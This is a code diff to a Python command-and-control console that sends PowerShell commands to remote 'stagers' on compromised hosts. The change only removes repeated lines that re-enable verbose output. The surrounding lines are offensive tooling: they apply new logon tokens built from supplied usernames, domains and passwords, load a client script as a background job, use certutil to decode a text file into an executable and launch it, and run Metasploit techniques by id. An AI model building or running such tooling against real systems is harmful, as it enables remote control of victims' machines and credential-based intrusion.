@@ -622,8 +622,7 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_INIT)
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_NEWTOKEN.format(user_input_username,user_input_domain,user_input_password))
                     
-                    #enable verbose
-                    self.__t_myserver.set_verbose(True)
+                    
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSRESET:
@@ -765,8 +764,7 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,"ps","cd {}".format(user_input_path))
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.NET_CD)
                     
-                    #enable verbose
-                    self.__t_myserver.set_verbose(True)
+                    
                     continue
                 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_DOWNLOAD:
@@ -844,8 +842,7 @@ class mymainclass():
                     self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-myclient.ps1")
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
                     
-                    #enable verbose
-                    self.__t_myserver.set_verbose(True)
+                    
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_SPAWN_PS:
@@ -878,8 +875,7 @@ class mymainclass():
                     
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
                     
-                    #enable verbose
-                    self.__t_myserver.set_verbose(True)
+                    
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_WHOAMI:
@@ -944,8 +940,7 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,"ps","certutil -decode {} {}".format(os.path.join(user_input_path,"{}.txt".format(t_name)),os.path.join(user_input_path,"{}.exe".format(t_name))))
                     self.__t_myserver.create_command(user_input_stager,"ps","Start-Process {}".format(os.path.join(user_input_path,"{}.exe".format(t_name))))
                     
-                    #enable verbose
-                    self.__t_myserver.set_verbose(True)
+                    
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_KERBER:
@@ -1006,7 +1001,7 @@ class mymainclass():
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_MSF:
                     #disable verbose
                     self.__t_myserver.set_verbose(False)
-                    
+
                     #set auto compete to stager uuid
                     setautocomplete(self.__t_myserver.get_running_stager())
 
@@ -1044,8 +1039,7 @@ class mymainclass():
                     user_input_tech = input("Please enter tech id: ")
                     self.__t_myserver.create_command(user_input_stager,"ps","Invoke-msf {}".format(user_input_tech))
 
-                    #enable verbose
-                    self.__t_myserver.set_verbose(True)
+                    
                     continue
 
 
